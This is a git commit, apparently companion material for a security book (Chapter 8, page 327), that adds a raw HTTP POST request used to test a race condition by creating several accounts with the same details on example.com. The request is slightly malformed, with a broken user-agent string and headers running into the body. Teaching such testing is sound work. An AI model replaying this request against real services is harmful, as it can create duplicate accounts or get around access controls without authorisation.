cba6019d91270acb03c4bb2ecf9468b08f4dd683
RedSecLabs <samaak@redseclabs.com>
2024-12-17 23:35:41 +0500

    Create MultipleAccount-SameDetails-RaceCondition.js

---
+++ Chapter-8/MultipleAccount-SameDetails-RaceCondition.js
@@ -0,0 +1,14 @@
+// page # 327
+
+POST /a/1a2b3XyZ/users/ HTTP/1.1
+Host: example.com
+Content-Length: 138
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x648 Safari/537.36)
+Cookie: __stripe_mid=xyz123abc789; sessionid=def456ghi012
+Accept: text/html,application/xhtml+xml,application/xml; 
+q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8, 
+application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cache-Control: max-age=0csrfmiddlewaretoken=ijklmnopqrst&name=Race&email=race%40testing.com&permission=EXAMPLE
